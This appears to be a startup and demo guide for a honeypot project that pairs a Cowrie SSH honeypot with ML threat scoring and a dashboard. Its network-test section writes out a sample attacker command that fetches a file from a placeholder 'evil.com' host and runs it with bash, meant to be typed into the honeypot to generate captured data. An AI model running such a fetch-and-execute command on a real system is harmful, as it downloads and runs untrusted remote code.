# 🚀 COMPLETE PROJECT STARTUP GUIDE

## ✅ PRE-STARTUP CHECKLIST

Before starting, verify:
- [ ] WSL Ubuntu-22.04 installed
- [ ] PostgreSQL running (check: `Get-Service postgresql*`)
- [ ] All previous terminals closed
- [ ] Port 2222, 3000, 5173, 8001 not in use

---

## 📋 STARTUP SEQUENCE (EXACT ORDER)

### **TERMINAL 1: Cowrie Honeypot** 
**Shell:** PowerShell  
**Purpose:** SSH honeypot that captures attacks

```powershell
# Step 1: Navigate to project
cd D:\boda\AI-Honeynet\HoneyNet

# Step 2: Start Cowrie
wsl -d Ubuntu-22.04 -u cowrie -- bash -c "cd ~/cowrie && source cowrie-env/bin/activate && twistd --umask=0022 --pidfile var/run/cowrie.pid --logger cowrie.python.logfile.logger cowrie"
```

**Expected Output:**
```
Starting cowrie...
Cowrie running (PID: XXXXX)
```

**DO NOT CLOSE THIS TERMINAL!**

---

### **TERMINAL 2: ML Service**
**Shell:** PowerShell  
**Purpose:** Machine learning models for threat analysis

```powershell
# Step 1: Navigate to ML service
cd D:\boda\AI-Honeynet\HoneyNet\ml-service

# Step 2: Start ML service
& D:\boda\AI-Honeynet\HoneyNet\ml-service\venv\Scripts\python.exe -m uvicorn app:app --host 0.0.0.0 --port 8001
```

**Expected Output:**
```
✅ Loaded Isolation Forest model
✅ Loaded Autoencoder model + scalers
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:8001
```

**Wait for BOTH checkmarks before proceeding!**

**DO NOT CLOSE THIS TERMINAL!**

---

### **TERMINAL 3: Backend (Node.js)**
**Shell:** PowerShell  
**Purpose:** Processes events and sends to ML

```powershell
# Step 1: Navigate to project
cd D:\boda\AI-Honeynet\HoneyNet

# Step 2: Start backend
npm start
```

**Expected Output:**
```
Server running on port 3000
Database connected
Watching Cowrie log file...
```

**DO NOT CLOSE THIS TERMINAL!**

---

### **TERMINAL 4: Frontend (React Dashboard)**
**Shell:** PowerShell  
**Purpose:** Web dashboard for monitoring

```powershell
# Step 1: Navigate to frontend
cd D:\boda\AI-Honeynet\HoneyNet\frontend

# Step 2: Start frontend
npm run dev
```

**Expected Output:**
```
VITE v5.x.x  ready in XXX ms

  ➜  Local:   http://localhost:5173/
  ➜  Network: http://192.168.1.4:5173/
```

**DO NOT CLOSE THIS TERMINAL!**

---

### **TERMINAL 5: Network Port Forwarding (Admin Required)**
**Shell:** PowerShell (Run as Administrator)  
**Purpose:** Allow network access to Cowrie

```powershell
# Navigate to project
cd D:\boda\AI-Honeynet\HoneyNet

# Run port forward setup
.\setup-wsl-port-forward.ps1
```

**Expected Output:**
```
✅ Port forwarding configured!
Active port forwarding rules:
  0.0.0.0:2222 → 172.26.XX.XX:2222
```

**You can close this terminal after success**

---

## ✅ VERIFICATION STEPS

### **1. Check All Services (Terminal 6)**

```powershell
# Check Cowrie
wsl -d Ubuntu-22.04 -u cowrie -- bash -c "ps aux | grep twistd | grep -v grep"

# Check ML Service
curl http://localhost:8001/health | ConvertFrom-Json

# Check Backend
curl http://localhost:3000

# Check Frontend
curl http://localhost:5173

# Check Port Forwarding
netstat -an | findstr 2222
```

**Expected:**
- Cowrie: Process running ✅
- ML: `{"status":"healthy","models_loaded":true}` ✅
- Backend: HTML response ✅
- Frontend: HTML response ✅
- Port: `0.0.0.0:2222` LISTENING ✅

---

### **2. Open Dashboard**

Open browser: **http://localhost:5173**

You should see:
- Total events count
- Attack severity breakdown
- Attackers table
- Live updates

---

### **3. Test Network Attack (From Other Device)**

From your phone/laptop on same WiFi:

```bash
ssh -p 2222 root@192.168.1.4
# Password: anything
# Command: wget http://evil.com/malware && bash malware
# Command: exit
```

Then verify:
```powershell
cd D:\boda\AI-Honeynet\HoneyNet
.\verify-network-attack.ps1
```

---

## 🎯 TERMINAL LAYOUT SUMMARY

```
┌─────────────────┬─────────────────┐
│  Terminal 1     │  Terminal 2     │
│  [Cowrie]       │  [ML Service]   │
│  Running...     │  Running...     │
├─────────────────┼─────────────────┤
│  Terminal 3     │  Terminal 4     │
│  [Backend]      │  [Frontend]     │
│  Running...     │  Running...     │
└─────────────────┴─────────────────┘
```

**Keep ALL 4 terminals open!**

---

## 🐛 TROUBLESHOOTING

### **Issue: "Port already in use"**

```powershell
# Find and kill process on port
Get-Process -Id (Get-NetTCPConnection -LocalPort XXXX).OwningProcess | Stop-Process -Force
```

### **Issue: "Cowrie not starting"**

```powershell
# Check if already running
wsl -d Ubuntu-22.04 -u cowrie -- bash -c "ps aux | grep twistd"

# Kill if needed
wsl -d Ubuntu-22.04 -u cowrie -- bash -c "pkill twistd"

# Try again
```

### **Issue: "ML models not loading"**

```powershell
# Check if files exist
dir D:\boda\AI-Honeynet\HoneyNet\ml-service\model

# Should show:
# - isolation_forest_model.pkl (443 KB)
# - autoencoder_model_colab.keras (608 KB)
# - tfidf_vectorizer_colab.pkl (4 KB)
# - num_scaler_colab.pkl (671 bytes)
```

### **Issue: "Database connection failed"**

```powershell
# Check PostgreSQL
Get-Service postgresql*

# If stopped:
Start-Service postgresql-x64-18
```

### **Issue: "Network attacks not showing"**

1. Verify port forwarding: `.\setup-wsl-port-forward.ps1`
2. Check firewall: `.\open-firewall.ps1` (as admin)
3. Verify Cowrie listening: `wsl -d Ubuntu-22.04 -u cowrie -- bash -c "ss -tlnp | grep 2222"`

---

## 🎬 DEMO PRESENTATION SEQUENCE

### **1. Start Everything (5 minutes before demo)**
- Follow startup sequence above
- Verify all 4 services running

### **2. Show Dashboard (1 minute)**
- Open http://localhost:5173
- Show existing attack data

### **3. Live Attack Demo (2 minutes)**
- From other device: `ssh -p 2222 root@192.168.1.4`
- Run malicious commands
- Exit

### **4. Show ML Analysis (1 minute)**
- Run: `.\verify-network-attack.ps1`
- Point to ML scores
- Highlight different IP address

### **5. Key Talking Points**
> - "Cowrie captures attacks without executing them"
> - "ML analyzes command patterns in real-time"
> - "System works over network, not just localhost"
> - "Different IPs prove network functionality"
> - "HIGH/MEDIUM/LOW severity based on ML, not rules"

---

## 📊 SUCCESS CRITERIA

✅ All 4 terminals running without errors  
✅ Dashboard accessible at localhost:5173  
✅ ML service returns health check  
✅ Network attack from other device works  
✅ ML scores appear in database  
✅ Different source IP captured (not 127.0.0.1)  

---

## 🔄 SHUTDOWN SEQUENCE

When done:

```powershell
# 1. Stop Cowrie (Terminal 1) - Press Ctrl+C

# 2. Stop ML Service (Terminal 2) - Press Ctrl+C

# 3. Stop Backend (Terminal 3) - Press Ctrl+C

# 4. Stop Frontend (Terminal 4) - Press Ctrl+C

# 5. Remove port forwarding (optional)
netsh interface portproxy delete v4tov4 listenport=2222 listenaddress=0.0.0.0
```

---

## 🎯 QUICK START (Copy-Paste Version)

### **Terminal 1:**
```powershell
cd D:\boda\AI-Honeynet\HoneyNet; wsl -d Ubuntu-22.04 -u cowrie -- bash -c "cd ~/cowrie && source cowrie-env/bin/activate && twistd --umask=0022 --pidfile var/run/cowrie.pid --logger cowrie.python.logfile.logger cowrie"
```

### **Terminal 2:**
```powershell
cd D:\boda\AI-Honeynet\HoneyNet\ml-service; & D:\boda\AI-Honeynet\HoneyNet\ml-service\venv\Scripts\python.exe -m uvicorn app:app --host 0.0.0.0 --port 8001
```

### **Terminal 3:**
```powershell
cd D:\boda\AI-Honeynet\HoneyNet; npm start
```

### **Terminal 4:**
```powershell
cd D:\boda\AI-Honeynet\HoneyNet\frontend; npm run dev
```

**Done! All services running!** 🚀
